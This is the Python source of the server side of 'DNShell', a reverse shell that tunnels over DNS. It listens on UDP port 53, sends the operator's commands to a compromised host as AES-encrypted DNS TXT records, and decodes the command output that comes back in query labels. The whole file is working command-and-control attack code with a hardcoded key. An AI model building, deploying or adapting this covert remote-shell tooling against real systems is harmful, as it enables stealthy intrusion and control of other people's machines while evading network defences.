#!/usr/bin/env python
# -*- coding: utf-8 -*-
# DNShell Server V1.7

from Crypto.Cipher import AES
import socket
import dnslib
import base64
import time
import sys

DNSHELL = """
  ██████╗ ███╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗      '       /  |    | 
  ██╔══██╗████╗  ██║██╔════╝██║  ██║██╔════╝██║     ██║     /__      ___ (  /     
  ██║  ██║██╔██╗ ██║███████╗███████║█████╗  ██║     ██║     \\--`-'-|`---\\ |      
  ██║  ██║██║╚██╗██║╚════██║██╔══██║██╔══╝  ██║     ██║ V1.7 |' _/   ` __/  /       
  ██████╔╝██║ ╚████║███████║██║  ██║███████╗███████╗███████╗ '._  ,A   _,--'     
  ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝    |_:_._/      
  https://github.com/ahhh/Reverse_DNS_Shell
"""

PORT = 53
NXT_CMD = base64.b64encode("nxt")
PROMPT = 'SHELL >> '
#PROMPT_COLORED = '\033[33mSHELL\033[0m \033[35m>> \033[0m'
BLOCK_SIZE = 32  # Block size for cipher object: must be 16, 24, or 32 for AES
PADDING = '{'  # Character used for padding
EXIT = 0 # Used to keep track of 'quit' command
# REPLACE THIS WITH YOUR OWN KEY AND IV #
secret = "TyKuwAt5vg1m48z2qYs6cUalHQrDpG0B"
iv = "1cYGbLz8qN4umT4c"

# one-liner to sufficiently pad the text to be encrypted:
PAD = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# Encrypt with AES, encode with base64:
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(PAD(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

# create a CBC cipher object using a random secret and iv
cipher = AES.new(secret, AES.MODE_CBC, iv)

def encrypt(string):
  encoded = EncodeAES(cipher, string)
  return encoded

def decrypt(string):
  decoded = DecodeAES(cipher, string)
  return decoded

def killApplication():
  print '\n\n--[ Connection Ended ]--\n'
  exit(0)

def spawnShell(answer, payload):
  # Spawns our Command Shell:
  shellInput = raw_input(PROMPT)
  if shellInput == 'quit': EXIT = 1 #Set program to exit cleanly
  if shellInput == '': spawnShell(answer, payload) # Prevents whitespace issues
  out = base64.b64encode(encrypt(shellInput))
  answer.add_answer(
    *dnslib.RR.fromZone('{}.com 60 TXT "{}"'.format(payload, out)))
  return answer

def dashDecode(b64Cmd):
  # Converts encoded '-' padding to '=':
  if b64Cmd[3] == '-':
    b64Cmd = b64Cmd[0] + b64Cmd[2] + b64Cmd[4:] + '=='
  elif b64Cmd[1] == '-':
    b64Cmd = b64Cmd[0] + b64Cmd[2:] + '='
  return b64Cmd

def recievePayload(udps):
  data, addr = udps.recvfrom(1024)
  dnsD = dnslib.DNSRecord.parse(data)
  payload = dnsD.questions[0].qname.label[0]
  answer = dnsD.reply()
  return addr, payload, answer

def printResult(cmd_list):
  try:
    b64Cmd = ''.join(cmd_list)
    b64Cmd = dashDecode(b64Cmd)
    print '{}'.format(decrypt(base64.b64decode(b64Cmd))).strip()
  except:
    # Base64 Decode Failed.
    print '[ERROR]: Couldn\'t Read Result from Host!'

def shellIntro():
  for line in DNSHELL.split('\n'):
   time.sleep(0.048)
   print(line)

def main():
  shellIntro()  # Print the ASCII
  cmd_list = []  # Stores List of B64 Commands to be Executed
  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('', PORT))  # Bind to the specified port
  print '\t.... Waiting for Request ....' 
  try:
    # Setup Initial Command Shell:
    addr, payload, answer = recievePayload(udps)
    answer = spawnShell(answer, payload)
    udps.sendto(answer.pack(), addr)

    # Main Event Loop:
    while 1:
      addr, payload, answer = recievePayload(udps)
      if (payload == NXT_CMD):
        printResult(cmd_list)
        cmd_list = []
        answer = spawnShell(answer, payload)
      else:
        cmd_list.append(payload)

      # Send back Response:
      udps.sendto(answer.pack(), addr)
      if EXIT == 1: killApplication()

  except (KeyboardInterrupt, EOFError) as e:
    udps.close()
    killApplication()


if __name__ == '__main__':
  main()
